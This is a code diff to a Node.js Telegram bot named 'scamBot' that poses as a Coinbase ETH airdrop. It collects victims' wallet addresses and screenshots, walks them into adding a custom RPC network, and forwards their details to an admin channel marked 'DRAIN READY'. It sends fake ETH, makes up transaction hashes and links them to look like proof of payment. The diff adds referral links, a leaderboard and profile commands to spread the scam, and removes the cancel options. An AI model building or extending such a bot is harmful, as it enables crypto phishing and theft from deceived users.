@@ -23,7 +23,7 @@ const updateUser = (id, updates) => {
 };
 const getUserByCode = (code) => Object.values(usersDB).find(u => u.referralCode === code);
 
-// === UPDATED RPC GUIDE ===
+// === RPC GUIDE ===
 const RPC_GUIDE = `
 Add this network to Coinbase Wallet:
 
@@ -58,29 +58,21 @@ const sendFakeETH = async (to, eth) => {
   } catch {}
 };
 
-// === BUTTON KEYBOARDS ===
+// === BUTTONS ===
 const walletKeyboard = Markup.inlineKeyboard([
   [Markup.button.callback('Send Wallet + Screenshot', 'send_wallet')]
 ]);
-
 const rpcKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback('I Added Network', 'rpc_done')],
-  [Markup.button.callback('Cancel', 'cancel')]
+  [Markup.button.callback('I Added Network', 'rpc_done')]
 ]);
-
 const rpcProofKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback('Send RPC Proof', 'send_rpc_proof')],
-  [Markup.button.callback('Back', 'back_to_rpc')]
+  [Markup.button.callback('Send RPC Proof', 'send_rpc_proof')]
 ]);
-
 const twitterKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback('Send Twitter Proof', 'send_twitter_proof')],
-  [Markup.button.callback('Back', 'back_to_rpc')]
+  [Markup.button.callback('Send Twitter Proof', 'send_twitter_proof')]
 ]);
-
 const claimKeyboard = Markup.inlineKeyboard([
-  [Markup.button.callback('CLAIM $50 ETH', 'claim_eth')],
-  [Markup.button.callback('Cancel', 'cancel')]
+  [Markup.button.callback('CLAIM $50 ETH', 'claim_eth')]
 ]);
 
 // === /start ===
@@ -110,7 +102,8 @@ scamBot.start(async (ctx) => {
         updateUser(referrer.telegramId, referrer);
         await sendFakeETH(referrer.wallet || '0xFAKE', 0.004);
         scamBot.telegram.sendMessage(referrer.telegramId,
-          `*+1 Referral!* $10 ETH sent.\nTotal: $${referrer.totalEarned}`
+          `*+1 Referral!* $10 ETH sent.\nTotal: $${referrer.totalEarned}\n` +
+          `Link: t.me/coinbase_eth_airdrop_bot?start=ref_${referrer.referralCode}`
         );
       }
     }
@@ -120,38 +113,84 @@ scamBot.start(async (ctx) => {
     );
   }
 
+  ctx.reply(`Drop your Coinbase wallet address + screenshot, fucker.`, walletKeyboard);
+});
+
+// === COMMANDS ===
+
+// /profile
+scamBot.command('profile', (ctx) => {
+  const user = getUser(ctx.from.id);
+  if (!user) return ctx.reply('Use /start first.');
+
+  const refCount = user.referrals.length;
+  const refLink = `t.me/coinbase_eth_airdrop_bot?start=ref_${user.referralCode}`;
+
   ctx.reply(
-    `Drop your Coinbase wallet address + screenshot, fucker.`,
-    walletKeyboard
+    `*YOUR PROFILE*\n\n` +
+    `User: @${user.username}\n` +
+    `Wallet: \`${user.wallet || 'Not set'}\`\n` +
+    `Total Earned: $${user.totalEarned}\n` +
+    `Referrals: ${refCount}\n` +
+    `Your Link: ${refLink}`,
+    { parse_mode: 'Markdown' }
   );
 });
 
-// === BUTTON: SEND WALLET ===
-scamBot.action('send_wallet', async (ctx) => {
+// /referral
+scamBot.command('referral', (ctx) => {
+  const user = getUser(ctx.from.id);
+  if (!user) return ctx.reply('Use /start first.');
+
+  const refLink = `t.me/coinbase_eth_airdrop_bot?start=ref_${user.referralCode}`;
+  ctx.reply(
+    `*YOUR REFERRAL LINK*\n\n` +
+    `Share this to earn $10 per referral:\n` +
+    `${refLink}\n\n` +
+    `You have ${user.referrals.length} referrals.`,
+    { parse_mode: 'Markdown' }
+  );
+});
+
+// /leaderboard
+scamBot.command('leaderboard', (ctx) => {
+  const leaderboard = Object.values(usersDB)
+    .sort((a, b) => b.totalEarned - a.totalEarned)
+    .slice(0, 10);
+
+  if (leaderboard.length === 0) {
+    return ctx.reply('No one on leaderboard yet.');
+  }
+
+  let text = `*LEADERBOARD — TOP 10 EARNERS*\n\n`;
+  leaderboard.forEach((u, i) => {
+    text += `${i + 1}. @${u.username} — $${u.totalEarned} (${u.referrals.length} refs)\n`;
+  });
+
+  ctx.reply(text, { parse_mode: 'Markdown' });
+});
+
+// === BUTTON ACTIONS ===
+scamBot.action('send_wallet', (ctx) => {
   let user = getUser(ctx.from.id);
   if (!user) return;
   user.stage = 'wallet_ss';
   saveUser(user);
-  ctx.editMessageText(`Send your wallet address + screenshot now.`, { reply_markup: null });
+  ctx.editMessageText(`Send wallet + screenshot now.`);
 });
 
-// === PHOTO: WALLET + SS ===
 scamBot.on('photo', async (ctx) => {
   let user = getUser(ctx.from.id);
-  if (!user) return ctx.reply('Use /start first.');
+  if (!user) return ctx.reply('Use /start.');
 
   const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
 
   if (user.stage === 'wallet_ss') {
-    user.wallet = "0x" + Math.random().toString(16).substr(2, 40);
+    user.wallet = "0x" + Math.random().toString(16).substr(2, 40); // FULL 42
     user.stage = 'rpc_guide';
     saveUser(user);
 
-    await sendToAdmin(
-      `*WALLET + SS*\nUser: @${user.username}\nWallet: \`${user.wallet}\``,
-      fileId
-    );
-
+    await sendToAdmin(`*WALLET + SS*\nUser: @${user.username}\nWallet: \`${user.wallet}\``, fileId);
     ctx.reply(RPC_GUIDE, rpcKeyboard);
     return;
   }
@@ -159,64 +198,44 @@ scamBot.on('photo', async (ctx) => {
   if (user.stage === 'rpc_proof') {
     user.stage = 'twitter_tasks';
     saveUser(user);
-
-    await sendToAdmin(
-      `*RPC PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\``,
-      fileId
-    );
-
-    ctx.reply(
-      `RPC locked. Now:\n1. Follow @BjExchange53077\n2. Like pinned post\n3. Tag 3 friends`,
-      twitterKeyboard
-    );
+    await sendToAdmin(`*RPC PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\``, fileId);
+    ctx.reply(`Follow @BjExchange53077, like pinned, tag 3 friends.`, twitterKeyboard);
     return;
   }
 
   if (user.stage === 'twitter_proof') {
     user.stage = 'claim_ready';
     saveUser(user);
-
-    await sendToAdmin(
-      `*TWITTER PROOF — DRAIN READY*\nUser: @${user.username}\nWallet: \`${user.wallet}\``,
-      fileId
-    );
-
-    ctx.reply(
-      `*Tasks verified!* You earned $50 ETH!\n\nClick to claim:`,
-      claimKeyboard
-    );
+    await sendToAdmin(`*TWITTER PROOF*\nUser: @${user.username}\nWallet: \`${user.wallet}\``, fileId);
+    ctx.reply(`*Tasks done!* Claim $50 ETH:`, claimKeyboard);
     return;
   }
 
-  ctx.reply("Photo received. Keep going, fucker.");
+  ctx.reply("Photo received.");
 });
 
-// === BUTTON: RPC DONE ===
-scamBot.action('rpc_done', async (ctx) => {
+scamBot.action('rpc_done', (ctx) => {
   let user = getUser(ctx.from.id);
   if (!user || user.stage !== 'rpc_guide') return;
   user.stage = 'rpc_proof';
   saveUser(user);
-  ctx.editMessageText(`Send screenshot of Chain ID 90000 now.`, rpcProofKeyboard);
+  ctx.editMessageText(`Send Chain ID 90000 proof.`, rpcProofKeyboard);
 });
 
-// === BUTTON: SEND RPC PROOF ===
-scamBot.action('send_rpc_proof', async (ctx) => {
+scamBot.action('send_rpc_proof', (ctx) => {
   let user = getUser(ctx.from.id);
   if (!user || user.stage !== 'rpc_proof') return;
-  ctx.editMessageText(`Send the RPC proof now.`, { reply_markup: null });
+  ctx.editMessageText(`Send proof now.`);
 });
 
-// === BUTTON: SEND TWITTER PROOF ===
-scamBot.action('send_twitter_proof', async (ctx) => {
+scamBot.action('send_twitter_proof', (ctx) => {
   let user = getUser(ctx.from.id);
   if (!user || user.stage !== 'twitter_tasks') return;
   user.stage = 'twitter_proof';
   saveUser(user);
-  ctx.editMessageText(`Send proof of Twitter tasks now.`, { reply_markup: null });
+  ctx.editMessageText(`Send Twitter proof now.`);
 });
 
-// === BUTTON: CLAIM ETH ===
 scamBot.action('claim_eth', async (ctx) => {
   let user = getUser(ctx.from.id);
   if (!user || user.stage !== 'claim_ready') return;
@@ -226,27 +245,26 @@ scamBot.action('claim_eth', async (ctx) => {
   await sendFakeETH(user.wallet, 0.02);
 
   const txHash = "0xFAKE" + Math.random().toString(16).substr(2, 64);
+  const refLink = `t.me/coinbase_eth_airdrop_bot?start=ref_${user.referralCode}`;
+
   ctx.editMessageText(
     `*CLAIMED!* $50 ETH sent to:\n\`\`\`\n${user.wallet}\`\`\`\n\n` +
     `Tx: https://dashboard.tenderly.co/tx/mainnet/${txHash}\n\n` +
-    `*Share:* t.me/coinbase_eth_airdrop_bot?start=ref_${user.referralCode}`,
+    `*Share:*\n${refLink}`,
     { parse_mode: 'Markdown' }
   );
 
   await sendToAdmin(
-    `*CLAIMED $50*\nUser: @${user.username}\nWallet: \`${user.wallet}\`\nTx: \`${txHash}\``
+    `*CLAIMED $50 ETH*\n` +
+    `User: @${user.username}\n` +
+    `Wallet: \`${user.wallet}\`\n` +
+    `Tx: \`${txHash}\`\n` +
+    `Link: ${refLink}`
   );
 });
 
-// === CANCEL / BACK ===
-scamBot.action('cancel', (ctx) => ctx.editMessageText(`Canceled. Use /start to try again.`));
-scamBot.action('back_to_rpc', (ctx) => ctx.editMessageText(RPC_GUIDE, rpcKeyboard));
-
-// === ERROR & SERVER ===
-scamBot.catch((err, ctx) => {
-  console.error('ERROR:', err);
-  try { ctx.reply('Error. Try again.'); } catch {}
-});
+// === SERVER ===
+scamBot.catch((err, ctx) => console.error('ERROR:', err));
 
 const app = express();
 app.use(express.json());
